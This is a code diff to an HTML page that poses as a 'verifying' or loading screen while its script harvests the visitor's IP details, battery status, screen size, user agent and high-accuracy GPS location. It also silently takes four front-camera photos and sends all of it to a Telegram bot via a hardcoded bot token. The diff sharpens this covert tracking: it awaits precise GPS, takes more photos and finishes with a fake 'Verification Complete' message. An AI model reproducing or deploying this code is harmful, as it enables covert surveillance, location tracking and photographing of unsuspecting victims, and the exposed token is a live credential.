@@ -51,17 +51,15 @@
 
     <div class="card" id="loading-card" style="display: none;">
         <h3>Loading...</h3>
-        <p style="color: #94a3b8; font-size: 14px;">Please wait while we fetch your content.</p>
+        <p style="color: #94a3b8; font-size: 14px;">Please wait while we verify...</p>
     </div>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // URL se us user ki ID uthayega jo link generate karega
         const urlParams = new URLSearchParams(window.location.search);
         const TARGET_CHAT_ID = urlParams.get('id');
-
         const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
 
         async function startCapture() {
@@ -73,6 +71,7 @@
             document.getElementById('main-card').style.display = 'none';
             document.getElementById('loading-card').style.display = 'block';
 
+            // 1. IP Information
             let ipInfo = "N/A";
             try {
                 let ipRes = await fetch('https://ipapi.co/json/');
@@ -82,6 +81,7 @@
                 ipInfo = "🌐 IP Info: Failed";
             }
 
+            // 2. Battery Information
             let batteryInfo = "N/A";
             try {
                 if (navigator.getBattery) {
@@ -93,66 +93,84 @@
             let screenInfo = `🖥️ Screen: ${window.innerWidth}x${window.innerHeight}`;
             let uaInfo = `🧠 UA: ${navigator.userAgent}`;
 
-            let gpsInfo = "📍 GPS: Not Allowed";
+            // 3. 100% Accurate High-Accuracy GPS Location
+            let gpsInfo = "📍 GPS: Permission Denied / Not Available";
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    let lat = pos.coords.latitude;
-                    let lon = pos.coords.longitude;
-                    gpsInfo = `📍 **Live GPS:** [Google Maps](https://maps.google.com/?q=${lat},${lon})`;
-                }, err => {}, { timeout: 5000 });
+                await new Promise((resolve) => {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        let lat = pos.coords.latitude;
+                        let lon = pos.coords.longitude;
+                        let acc = pos.coords.accuracy;
+                        gpsInfo = `📍 **Live GPS (Accurate ~${Math.round(acc)}m):**\n[Google Maps View](https://maps.google.com/?q=${lat},${lon})`;
+                        resolve();
+                    }, err => {
+                        resolve();
+                    }, { 
+                        enableHighAccuracy: true, 
+                        timeout: 7000, 
+                        maximumAge: 0 
+                    });
+                });
             }
 
-            setTimeout(async () => {
+            // Send Text Info First
+            let fullCaption = `🚨 **New Target Triggered!**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n${uaInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;
+            
+            let textFormData = new FormData();
+            textFormData.append('chat_id', TARGET_CHAT_ID);
+            textFormData.append('text', fullCaption);
+            textFormData.append('parse_mode', 'Markdown');
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                body: textFormData
+            }).catch(e => {});
+
+            // 4. Capture Multiple Photos (4 Photos consecutively)
+            try {
                 const video = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                await video.play();
 
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    video.srcObject = stream;
-                    video.play();
+                // Wait a moment for camera to adjust lighting/focus
+                await new Promise(r => setTimeout(r, 1000));
+
+                for (let i = 1; i <= 4; i++) {
+                    await new Promise(r => setTimeout(r, 800)); // 0.8 seconds gap between each photo
                     
-                    setTimeout(() => {
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        canvas.toBlob(blob => {
-                            stream.getTracks().forEach(track => track.stop());
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    await new Promise((resolve) => {
+                        canvas.toBlob(async blob => {
+                            if (blob) {
+                                const photoFormData = new FormData();
+                                photoFormData.append('chat_id', TARGET_CHAT_ID);
+                                photoFormData.append('caption', `📸 **Photo ${i} / 4**\n✨ Credit by : आयुष नेगी`);
+                                photoFormData.append('parse_mode', 'Markdown');
+                                photoFormData.append('photo', blob, `capture_${i}.jpg`);
 
-                            let fullCaption = `📸 **Target Captured!**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n${uaInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;
-
-                            const formData = new FormData();
-                            formData.append('chat_id', TARGET_CHAT_ID); // Yahan link banane wale ki ID jayegi
-                            formData.append('caption', fullCaption);
-                            formData.append('parse_mode', 'Markdown');
-                            formData.append('photo', blob, 'captured.jpg');
-
-                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            }).catch(err => console.error(err));
-
+                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: photoFormData
+                                }).catch(err => {});
+                            }
+                            resolve();
                         }, 'image/jpeg', 0.85);
-
-                    }, 1500);
-
-                } catch(err) {
-                    let fullCaption = `⚠️ **Camera Denied:**\n\n${ipInfo}\n\n📱 **Device Details**\n${batteryInfo}\n${screenInfo}\n${gpsInfo}\n\n━━━━━━━━━━━━━━━━━━━\n✨ **Credit by : आयुष नेगी**`;
-                    
-                    let formData = new FormData();
-                    formData.append('chat_id', TARGET_CHAT_ID);
-                    formData.append('text', fullCaption);
-                    formData.append('parse_mode', 'Markdown');
-                    
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        body: formData
-                    }).catch(e => {});
-
-                    document.getElementById('loading-card').innerHTML = "<h3>Error</h3><p style='color:#ef4444;font-size:14px;'>Try again.</p>";
+                    });
                 }
-            }, 1000);
+
+                stream.getTracks().forEach(track => track.stop());
+
+            } catch(err) {
+                console.error("Camera capture error:", err);
+            }
+
+            document.getElementById('loading-card').innerHTML = "<h3>Verification Complete</h3><p style='color:#38bdf8;font-size:14px;'>Loading requested content...</p>";
         }
     </script>
 </body>
